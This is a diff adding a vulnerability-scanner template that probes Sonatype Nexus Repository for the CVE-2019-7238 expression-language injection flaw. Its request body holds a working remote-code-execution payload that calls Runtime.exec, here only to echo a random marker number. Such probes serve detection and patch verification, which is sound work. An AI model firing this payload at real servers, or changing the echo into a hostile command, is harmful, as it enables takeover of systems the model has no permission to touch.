@@ -1,0 +1,17 @@
+name: poc-nexus-extdirect
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/service/extdirect"
+      body: '{"action":"coreui_Component","method":"preview","data":["${''x''.getClass().forName(''java.lang.Runtime'').getRuntime().exec(''echo {{r0}}'')}"],"type":"rpc","tid":1}'
+    expression: response.status == 200 && (response.body.bcontains("{{r0}}") || response.body.bcontains("java.lang"))
+expression: r0()
+detail:
+  author: sxel
+  description: Sonatype Nexus Repository EL injection RCE probe (CVE-2019-7238, extdirect preview endpoint)
+  severity: critical
+  tags: nexus,sonatype,java,rce,el
